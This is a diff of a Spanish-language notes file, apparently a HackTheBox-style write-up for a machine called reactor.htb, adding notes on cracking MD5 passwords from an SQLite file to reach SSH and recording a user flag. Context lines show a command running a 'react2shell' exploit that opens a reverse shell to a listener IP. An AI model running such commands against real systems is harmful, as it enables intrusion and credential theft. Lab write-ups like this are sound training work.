@@ -7,6 +7,7 @@ os: Linux
 tags:
   - RCE
   - NextJS
+  - MD5
 status: ""
 ---
 
@@ -54,9 +55,11 @@ status: ""
 node react2shell.js http://reactor.htb:3000 shell 10.10.14.5 4444
 ```
 
+- Al entrar nos encontramos un archivo [[SQLITE 3]] y accedimos a el
+- al descifrar las contraseñas md5 logramos conectarnos por [[SSH]] a uno de los usuarios
 **Prueba de acceso (User Flag):**
 ```bash
-
+c22002fee26e397a94ead78fb8587957
 ```
 
 ---
